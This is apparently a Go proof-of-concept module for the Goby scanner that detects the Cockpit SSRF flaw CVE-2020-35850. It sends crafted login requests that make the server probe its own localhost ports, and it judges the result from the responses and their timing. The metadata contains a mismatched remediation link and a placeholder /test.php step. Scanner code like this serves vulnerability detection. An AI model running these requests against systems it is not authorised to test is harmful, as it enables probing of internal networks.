package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
    "time"
)



func init() {
    expJson := `{
    "Name": "Cockpit web based management tool ssrf attack",
    "Description": "<p>Cockpit is a free and open source web-based management tool that allows system administrators to perform tasks such as storage management, network configuration, checking logs, managing containers, and more. </p><p>The device has ssrf vulnerability, which can be used to detect intranet information.</p>",
    "Product": "Cockpit",
    "Homepage": "https://cockpit-project.org/",
    "DisclosureDate": "2021-06-01",
    "Author": "mayi",
    "FofaQuery": "(body=\"PRETTY_NAME\" && body=\"CPE_NAME\" && body=\"cockpit\")",
    "GobyQuery": "(body=\"PRETTY_NAME\" && body=\"CPE_NAME\" && body=\"cockpit\")",
    "Level": "1",
    "Impact": "<p>Cockpit has an ssrf vulnerability, which can be exploited by attackers to obtain intranet information to constitute further attacks.</p>",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "CVEIDs": [
        "CVE-2020-35850"
    ],
    "CNNVD": [
        "CNNVD-202012-1805"
    ],
    "CNVD": [],
    "CVSSScore": "4.0",
    "Is0day": false,
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a></p><p>Unified error result display page.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "Cockpit 基于web管理工具 ssrf攻击",
            "Product": "Cockpit",
            "Description": "<p>Cockpit 是一个免费且开源的基于web的管理工具,系统管理员可以执行诸如存储管理、网络配置、检查日志、管理容器等任务。</p><p>Agentejo Cockpit cockpit-project.org 存在代码问题漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://cockpit-project.org/\">https://cockpit-project.org/</a></p><p>2、统一错误结果显示页面。<br></p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>4、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Cockpit 存在ssrf漏洞，攻击者可利用此漏洞获取内网信息，构成进一步攻击。</p>",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Cockpit web based management tool ssrf attack",
            "Product": "Cockpit",
            "Description": "<p>Cockpit is a free and open source web-based management tool that allows system administrators to perform tasks such as storage management, network configuration, checking logs, managing containers, and more. </p><p>The device has ssrf vulnerability, which can be used to detect intranet information.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a></p><p>Unified error result display page.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Cockpit has an ssrf vulnerability, which can be exploited by attackers to obtain intranet information to constitute further attacks.</p>",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "References": [
        "https://github.com/cockpit-project/cockpit/issues/15077"
    ],
    "HasExp": false,
    "ExpParams": [],
    "ScanSteps": [
        null
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "Cockpit"
        ]
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

            cockpithttp:=httpclient.NewGetRequestConfig("/cockpit+=127.0.0.1:22/login")
            cockpithttp.Header.Store("Cookie","machine-cockpit+127.0.0.1=deleted; cockpit=deleted")
            if resp, err := httpclient.DoHttpRequest(u, cockpithttp); err == nil {

                fmt.Printf("----------------------: 22-401")
                fmt.Printf(resp.RawBody)

                if strings.Contains(resp.Status, "401") && strings.Contains(resp.HeaderString.String(), "Authentication failed") && !strings.Contains(resp.HeaderString.String(), "no-host"){

                    cockpithttp=httpclient.NewGetRequestConfig("/cockpit+=127.0.0.1:55559/login")
                    cockpithttp.Header.Store("Cookie","machine-cockpit+127.0.0.1=deleted; cockpit=deleted")
                    cTime0 := time.Now()
                    if resp, err = httpclient.DoHttpRequest(u, cockpithttp); err == nil {

                        cTime1 := time.Now()
                        ctime := cTime1.Sub(cTime0)
                        fmt.Printf("----------------------: 55559-401-open")

                        time.Sleep(10*time.Second)
                        if (ctime.Seconds() > 7) && strings.Contains(resp.Status, "401") && strings.Contains(resp.HeaderString.String(), "Authentication failed: no-host"){
                            return true
                        }
                    }
                }
            }

            return false

        },
        nil,
    ))
}

//       ./goscanner -m Cockpit_ssrf -t 172.16.14.157:9090
